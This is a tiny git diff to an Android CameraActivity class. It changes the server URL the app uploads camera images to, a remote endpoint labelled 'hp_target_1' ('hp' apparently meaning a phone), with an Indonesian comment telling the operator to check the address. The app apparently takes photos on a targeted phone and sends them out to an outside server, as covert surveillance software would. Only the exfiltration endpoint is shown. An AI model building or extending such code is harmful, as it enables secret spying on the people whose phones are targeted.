@@ -21,7 +21,7 @@ public class CameraActivity extends Activity {
     private Camera camera;
     private int cameraId = 0;
     private boolean isFront = false;
-    private String serverUrl = "https://ax.pythonanywhere.com/api/upload_image/hp_target_1"; // PASTIKAN IP INI SESUAI
+    private String serverUrl = "https://ezax.pythonanywhere.com/api/upload_image/hp_target_1"; // PASTIKAN IP INI SESUAI
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
